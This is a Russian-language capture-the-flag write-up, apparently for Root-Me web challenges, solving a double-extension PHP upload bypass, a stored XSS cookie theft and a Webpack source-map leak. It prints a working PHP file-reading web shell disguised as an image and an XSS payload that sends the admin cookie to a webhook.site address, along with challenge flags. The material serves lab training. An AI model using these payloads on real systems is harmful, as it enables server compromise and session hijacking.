# File upload - Double extensions  
## –ì–∞–ª–µ—Ä–µ—è v0.02 
–í–∞—à–∞ —Ü–µ–ª—å - –≤–∑–ª–æ–º–∞—Ç—å —ç—Ç—É —Ñ–æ—Ç–æ–≥–∞–ª–µ—Ä–µ—é, –∑–∞–≥—Ä—É–∑–∏–≤ PHP-–∫–æ–¥.  
–ü–æ–ª—É—á–∏—Ç–µ –ø–∞—Ä–æ–ª—å –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤ —Ñ–∞–π–ª–µ .passwd –≤ –∫–æ—Ä–Ω–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.  

–ú—ã –ø–æ–ø–∞–¥–∞–µ–º –Ω–∞ —Å–∞–π—Ç, –≤ –∫–æ—Ç–æ—Ä–æ–º –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑–¥–µ–ª–æ–≤. –í –≥–ª–∞–∑–∞ –±—Ä–æ—Å–∞–µ—Ç—Å—è —Ä–∞–∑–¥–µ–ª "Upload"  
<img width="1919" height="988" alt="image" src="https://github.com/user-attachments/assets/0b2ec078-5ddc-4868-90e4-b6aef7017dc0" />  
–ü–æ–ø—Ä–æ–±—É–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ç—É–¥–∞ –æ–±—ã—á–Ω—É—é –∫–∞—Ä—Ç–∏–Ω–∫—É  
<img width="1919" height="1000" alt="image" src="https://github.com/user-attachments/assets/b59e1ff3-a395-4acd-a4ed-c5e4f3e0948b" />  
–ù–∞–º –¥–∞—é—Ç —Å—Å—ã–ª–∫—É, –≥–¥–µ —Ö—Ä–∞–Ω–∏—Ç—Å—è –Ω–∞—à–∞ –∫–∞—Ä—Ç–∏–Ω–∫–∞. –ü–æ–ø—Ä–æ–±—É–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ç—É–¥–∞ php —Å–∫—Ä–∏–ø—Ç, –Ω–æ –ø–æ–ª—É—á–∞–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ **Wrong file extension !**. –°–µ—Ä–≤–µ—Ä –ø–∏—à–µ—Ç: **NB : only .gif, .jpeg and .png are accepted**  
–ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Ñ–∞–π–ª shell.php.png —Å –¥–≤–æ–π–Ω—ã–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º  
shell.php.png  
```php
<?php
phpinfo();
?>
```
–æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –ø–æ–ª—É—á–∞–µ–º:  
<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/f86da319-2fa6-452c-9faa-6734df7a9ecc" />  
–°–µ—Ä–≤–µ—Ä –æ–±—Ä–∞–±–æ—Ç–∞–ª –Ω–∞—à –∑–∞–ø—Ä–æ—Å –∏ –≤—ã–≤–µ–ª –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é php  
–°–µ—Ä–≤–µ—Ä —á–∏—Ç–∞–µ—Ç —Ñ–∞–π–ª shell.php.png –∫–∞–∫ PHP-–∫–æ–¥ –±–ª–∞–≥–æ–¥–∞—Ä—è –∫–ª–∞—Å—Å–∏—á–µ—Å–∫–æ–π —É—è–∑–≤–∏–º–æ—Å—Ç–∏, —Å–≤—è–∑–∞–Ω–Ω–æ–π —Å –¥–≤–æ–π–Ω—ã–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º (Double Extension), –∫–æ—Ç–æ—Ä–∞—è –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –∏–∑-–∑–∞ —Å–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–æ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞, —á–∞—â–µ –≤—Å–µ–≥–æ Apache.
–ù–∞–ø–∏—Å–∞–ª —Å–∫—Ä–∏–ø—Ç, —á—Ç–æ–±—ã –≤—ã—Ç–∞—â–∏—Ç—å .passwd –∏–∑ –∫–æ—Ä–Ω–µ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏  
**shell.php.png**
```php
<?php
echo "<pre>";
// –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è (–æ–¥–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–∞–∑–∞–¥)
$dir = '../../..'; 
$target_filename = '.passwd';
$target_filepath = "$dir/$target_filename";

// –°–∫–∞–Ω–∏—Ä—É–µ–º —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
$files = @scandir($dir);

if ($files === false) {
    die("–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é '$dir'. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞.");
}

echo "
======================================
      –°–ü–ò–°–û–ö –§–ê–ô–õ–û–í –ò –ü–ê–ü–û–ö –í '$dir'
======================================\n";

// –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –º–∞—Å—Å–∏–≤
foreach ($files as $item) {
    // –ò—Å–∫–ª—é—á–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —Å—Å—ã–ª–∫–∏ ('.' –∏ '..')
    if ($item != '.' && $item != '..') {
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–∏–ø–∞ —ç–ª–µ–º–µ–Ω—Ç–∞
        $path = "$dir/$item";
        
        if (is_dir($path)) {
            echo "[DIR]  $item\n";
        } else {
            // –í—ã–¥–µ–ª—è–µ–º –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –≤–∞–∂–Ω—ã–µ —Ñ–∞–π–ª—ã
            if (preg_match('/(\.flag|\.key|\.secret|\.conf|\.passwd|config\.php|\.htaccess)/i', $item)) {
                echo "[FILE] !!!! $item\n";
            } else {
                echo "[FILE] $item\n";
            }
        }
    }
}

$file_content = @file_get_contents($target_filepath);
if ($file_content === false) {
    die("–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ '$target_filepath'. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞.");
}

// –í—ã–≤–æ–¥ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–∞
echo "
======================================
  üìú –°–û–î–ï–†–ñ–ò–ú–û–ï –§–ê–ô–õ–ê '$target_filepath'
======================================\n";
echo htmlspecialchars($file_content);

echo "</pre>";
?>
```
–ü–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —ç—Ç–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –ø–æ–ª—É—á–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–ª–∞–≥–∞ –∏ –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥!  
<img width="1918" height="983" alt="image" src="https://github.com/user-attachments/assets/9e9ca1b9-a558-4b5e-b349-3f2d14718be5" />  
```–§–ª–∞–≥: Gg9LRz-hWSxqqUKd77-_q-6G8```  


# XSS - Stock√©e 1  
## –£–∫—Ä–∞–¥–∏—Ç–µ —Ñ–∞–π–ª cookie —Å–µ–∞–Ω—Å–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –µ–≥–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ–±—ã—Ç–∏—è.  

–ü—Ä–∏ –∑–∞—Ö–æ–¥–µ –Ω–∞ —Å–∞–π—Ç, –º—ã –ø–æ–ª—É—á–∞–µ–º —Ç–∞–∫—É—é —Ñ–æ—Ä–º—É  
<img width="1919" height="993" alt="image" src="https://github.com/user-attachments/assets/6006305e-4333-459d-aee8-38e897d43f81" />  
–¢–∞–∫ –∫–∞–∫ –≤ –∑–∞–¥–∞–Ω–∏–∏ —Å–∫–∞–∑–∞–Ω–æ –ø—Ä–æ xss –ø–æ–ø—Ä–æ–±—É–µ–º –≤—ã–∑–≤–∞—Ç—å alert. Message: "**<script>alert('123);</script>**"  
<img width="1919" height="992" alt="image" src="https://github.com/user-attachments/assets/2a3b1fca-2bdb-4bc0-a030-4e0f8cfa000d" />  
–û—Ç–ª–∏—á–Ω–æ! –ú—ã –∏–º–µ–µ–º xss —É—è–∑–≤–∏–º–æ—Å—Ç—å. –¢–∞–∫ –∫–∞–∫ —É –Ω–∞—Å –∑–∞–¥–∞–Ω–∏–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å cookie –∞–¥–º–∏–Ω–∞, –ø–æ–ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –µ–≥–æ —Å –ø–æ–º–æ—â—å—é —Å–∫—Ä–∏–ø—Ç–∞, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ –Ω–∞—à —Å–∞–π—Ç, –≤ url –∫–æ—Ç–æ—Ä–æ–≥–æ –±—É–¥—É—Ç –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å—Å—è cookie –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –≤ –Ω–∞–¥–µ–∂–¥–µ, —á—Ç–æ –∞–¥–º–∏–Ω –∑–∞–π–¥–µ—Ç –Ω–∞ –Ω–µ–≥–æ.  
–î–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—É—á–∏–º —Å—Å—ã–ª–∫—É –Ω–∞ –Ω–∞—à —Å–∞–π—Ç —á–µ—Ä–µ–∑ https://webhook.site/ –∏ –Ω–∞–ø–∏—à–µ–º –Ω–µ–±–æ–ª—å—à–æ–π —Å–∫—Ä–∏–ø—Ç ```<script>document.write('<img src="http://webhook.site/YOUR-UNIQUE-ID?cmd=' + document.cookie + '" width=0 height=0 border=0 />');</script>```. –ü–æ—Å–ª–µ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∏ 'YOUR-UNIQUE-ID' –æ—Ç–ø—Ä–∞–≤–ª—è—é payload –≤ –ø–æ–ª–µ _message_.  
–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –∑–∞—à–µ–ª –Ω–∞ —Å–∞–π—Ç –∏ –º—ã –ø–æ–ª—É—á–∏–ª–∏ –µ–≥–æ cookie!
<img width="793" height="76" alt="image" src="https://github.com/user-attachments/assets/ae74d2fa-d1bc-46dd-95d0-cab629a3bf9b" />  
```ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6```  

# Javascript - Webpack
## –ù–∞–π–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å.
–ü—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É, —Å—Ä–∞–∑—É —Å–º–æ—Ç—Ä—é –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥. –ó–∞–º–µ—á–∞—é, —á—Ç–æ –≤—Å–µ js –ª–µ–∂–∞—Ç –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ **/static/js**
<img width="1919" height="272" alt="image" src="https://github.com/user-attachments/assets/ccd20e03-072a-4409-a6d7-14c7afe1abf1" />  
–ü–µ—Ä–µ—Ö–æ–∂—É –≤ —ç—Ç—É –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –∏ –≤–∏–∂—É —Ñ–∞–π–ª—ã —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º **.js.map** —Å–∫–∞—á–∏–≤–∞—é –ø–µ—Ä–≤—ã–π –∏–∑ –Ω–∏—Ö. 
<img width="1105" height="952" alt="image" src="https://github.com/user-attachments/assets/a898d088-8f8d-4f96-ae66-5b6da06025ac" />  
–ó–∞–≥—Ä—É–∂–∞—é –µ–≥–æ –Ω–∞ —Å–∞–π—Ç **https://evanw.github.io/source-map-visualization/** –¥–ª—è –±–æ–ª–µ–µ —É–¥–æ–±–Ω–æ–≥–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞. 
<img width="1919" height="991" alt="image" src="https://github.com/user-attachments/assets/14c02f7f-6ac9-4bc8-8638-79fabf883f96" />  
–°—Ä–∞–∑—É –∑–∞–º–µ—á–∞—é –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π webpack —Å –Ω–∞–∑–≤–∞–Ω–∏–µ–º **YouWillNotFindThisRouteBecauseItIsHidden.vue**  
–ò —Å—Ä–∞–∑—É –≤–∏–¥–Ω–æ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π —Å —Ñ–ª–∞–≥–æ–º, –æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –∞–≤—Ç–æ—Ä–æ–º.  
<img width="1919" height="987" alt="image" src="https://github.com/user-attachments/assets/b77002ee-d462-4b74-8658-a7c6442c548e" />  
```–§–ª–∞–≥: BecauseSourceMapsAreGreatForDebuggingButNotForProduction``` 
